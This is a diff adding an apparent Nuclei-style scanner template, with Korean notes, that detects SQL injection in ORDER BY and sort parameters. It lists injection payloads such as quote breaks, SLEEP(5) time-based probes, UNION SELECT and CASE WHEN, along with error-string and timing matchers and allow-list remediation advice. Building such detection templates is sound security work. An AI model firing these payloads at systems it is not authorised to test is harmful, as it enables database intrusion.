@@ -1,0 +1,45 @@
+id: sqli-order-by-sort
+
+info:
+  name: SQL Injection via ORDER BY / Sort Parameters
+  author: security-researcher
+  severity: high
+  description: |
+    ORDER BY, sort, column 등의 정렬 파라미터를 통한 SQL 인젝션 취약점을 탐지합니다.
+    Prepared Statement로 컬럼명을 바인딩할 수 없어 특히 취약한 영역입니다.
+  tags: sqli,order-by,sort,injection
+  remediation: |
+    - 허용된 컬럼명 화이트리스트 검증
+    - 정렬 방향은 ASC/DESC만 허용
+    - 동적 ORDER BY 시 컬럼명 검증 필수
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}?sort=name'"
+      - "{{BaseURL}}?orderby=name'"
+      - "{{BaseURL}}?order=1'"
+      - "{{BaseURL}}?sortby=name'"
+      - "{{BaseURL}}?column=name'"
+      - "{{BaseURL}}?sort=name ASC,SLEEP(5)--"
+      - "{{BaseURL}}?sort=(SELECT SLEEP(5))--"
+      - "{{BaseURL}}?sort=1,2,(SELECT 1 FROM (SELECT(SLEEP(5)))a)--"
+      - "{{BaseURL}}?order=IF(1=1,SLEEP(5),0)--"
+      - "{{BaseURL}}?sort=name,(SELECT 1 UNION SELECT 2)--"
+      - "{{BaseURL}}?sort=CASE WHEN 1=1 THEN name ELSE id END"
+      - "{{BaseURL}}?sort=(SELECT+1+FROM+(SELECT(SLEEP(5)))a)--"
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "you have an error in your sql syntax"
+          - "ORA-\\d{5}"
+          - "sql.*error|syntax.*error"
+        condition: or
+        case-insensitive: true
+
+      - type: dsl
+        dsl:
+          - "duration >= 5000"
